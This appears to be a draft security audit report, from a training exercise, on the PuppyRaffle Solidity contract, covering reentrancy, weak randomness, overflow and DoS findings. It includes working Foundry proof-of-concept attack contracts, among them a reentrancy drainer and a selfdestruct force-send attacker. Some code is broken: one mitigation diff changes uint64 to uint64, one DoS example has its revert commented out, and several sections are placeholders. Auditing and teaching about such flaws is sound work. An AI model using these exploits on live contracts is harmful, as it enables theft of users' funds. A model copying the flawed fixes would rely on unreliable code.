### [S-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denail of service (DoS) attack, incrementing gas cost for future entrants

**Description:** `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the array is, the more checks a new player will have to make, hence more gas costs. Every additional address in the `players` array, is an additional check the loop will have to make.

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering. An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guarenteeing themselves the win. 

**Proof of Concept:** 

If we have 2 sets of players enter, the gas costs will be as such:

- 1st 100 players: ~6503275
- 2nd 100 players: ~18995515

See `PuppyRaffleTest::test_DoS`

**Recommended Mitigation:** 

There are a few recommendations.

1. Consider allowing duplicates. Users cna make new wallet addresses anyways, so a duplicate check doesn't prevent the same person form entering multiple times, only the sanme wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time loopup of whether a user has already entered.

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance

**Description:** The `PuppyRaffle::refund` function does not follow [CEI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `player` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

A player who has called the `PuppyRaffle::refund` funtion could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` again and claim another refund. They could continue to cycle this until the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:** 

1. Users enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

**Proof of Code**

<details>
<summary>Code</summary>

Add the following code to the `PuppyRaffleTest.t.sol` file.

```javascript
contract ReentryAttacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    uint256 entranceFee;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(playerIndex);
        }
    }
}

function testReentrancy() public playerEntered {
    ReentryAttacker attacker = new ReentryAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 1 ether);
    uint256 startingAttackerBalance = address(attacker).balance;
    uint256 startingVictimBalance = address(puppyRaffle).balance;

    attacker.attack();

    uint256 endingAttackerBalance = address(attacker).balance;
    uint256 endingVictimBalance = address(puppyRaffle).balance;

    assertEq(endingAttackerBalance, startingAttackerBalance + startingVictimBalance);
    assertEq(endingVictimBalance, 0);
}
```

</details>


**Recommended Mitigation:** 

To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);

    payable(msg.sender).sendValue(entranceFee);

-    players[playerIndex] = address(0);
-    emit RaffleRefunded(playerAddress);
}
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

**Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values to know them ahead of time to choose the winner of the raffle themselves.

**Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.

**Proof of Concept:** 

There are a few attack vectors here.

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predit when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with `prvrando`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In Solidity version prior to `0.8.0`, integers were subject to integer overflows.

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the balance of `feeAddress` may not match `totalFees` collected, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. We first conclude a raffle of 4 players to collect some fees.
2. We then hava 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:
```javascript
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```
4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`: 
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdesturct` to force ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

<details>
<summary>Proof of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
    // startingTotalFees = 800000000000000000
    console.log("startingTotalFees = ", startingTotalFees);

    // We then have 89 players enter a new raffle
    uint256 playersNum = 89;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    // We end the raffle
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    puppyRaffle.selectWinner();

    uint256 endingTotalFees = puppyRaffle.totalFees();
    console.log("endingTotalFees = ", endingTotalFees);

    assert(endingTotalFees < startingTotalFees);

    vm.prank(puppyRaffle.feeAddress());
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here. 

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint64 public totalFees = 0;
```

This would make this cost of attack too high to perform.

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

### [H-4] `PuppyRaffle::selectWinner` can be reverted result in malicious winner can forever halt the raffle

**Description:** 

1. `(bool success,) = winner.call{value: prizePool}("");`
2. `_safeMint(winner, tokenId);`

**Impact:** ...

**Proof of Concept:**

```javascript
function testSelectWinnerDoS() public {
    address[] memory players = new address[](4);
    players[0] = address(new SelectWinnerAttacker());
    players[1] = address(new SelectWinnerAttacker());
    players[2] = address(new SelectWinnerAttacker());
    players[3] = address(new SelectWinnerAttacker());
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.expectRevert();
    puppyRaffle.selectWinner();
}
```

The following 3 cases would cause a revert.

```javascript
// 1. empty contract, meaning it can not be sent ETH
contract SelectWinnerAttacker { }

// 2. reverted receive or fallback function
contract SelectWinnerAttacker {
    receive() external payable {
        // revert();
    }
}

// 3. no implemented onERC721Received hook
contract SelectWinnerAttacker {
    receive() external payable {}
}
```

**Recommended Mitigation:** 

Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.

## Medium

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants

省略

### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to force send ETH to the raffle, blocking withdrawals.

**Description:** ...

**Proof of Concept:** ...

**Proof of Code:**

```javascript
function testwithdrawFeesDoS() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    WithdrawFeesAttacker attacker = new WithdrawFeesAttacker();
    console.log(
        "puppyRaffle.balance before attack: ",
        address(puppyRaffle).balance
    );
    attacker.attack{value: 1 ether}(address(puppyRaffle));
    console.log(
        "puppyRaffle.balance after attack: ",
        address(puppyRaffle).balance
    );
    vm.prank(puppyRaffle.feeAddress());
    vm.expectRevert();
    puppyRaffle.withdrawFees();
}

contract WithdrawFeesAttacker {
    function attack(address _puppyRaffle) public payable {
        selfdestruct(payable(_puppyRaffle));
    }
}
```

**Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function.

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

```javascript
uint256 fee = totalFees / 10;
...
totalFees = totalFees + uint64(fee);
```

The max value of a `uint64` in term of ETH is only ~`18` ETH. If more that 18ETH of fees are collected, the `fee` casting will truncate the value.

Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

function selectWinner() external {
...
- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;
...
}
```

### [M-4] Raffle winner contract without a `receive` or a `fallback` will block the start of a new contest

略

## Informational / Non-Critical

### [I-1] Floating pragmas

Lock up pragma versions.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```
### [I-2] Magic Numbers

All number literals should be replaced with constants.

### [I-3] Test Coverage

The test coverage is below 90%.

### [I-4] Zero address validation

`feeAddress` is not validated, means that it could be zero, and fees would be lost.

### [I-5] Unused funcion should be removed

The function `PuppyRaffle::_isActivePlayer` is never used and should be removed.

### [I-6] Unchanged variables should be constant or immutable

略

### [I-7] Incorrect active player index

The `getActivePlayerIndex` function returns zero for inactive users and the user store in the first slot of the `players` array.

We can use `type(uint256).max` to signal that the given player is inactive.

### [I-8] Zero address may be erroneously considered an active player

略


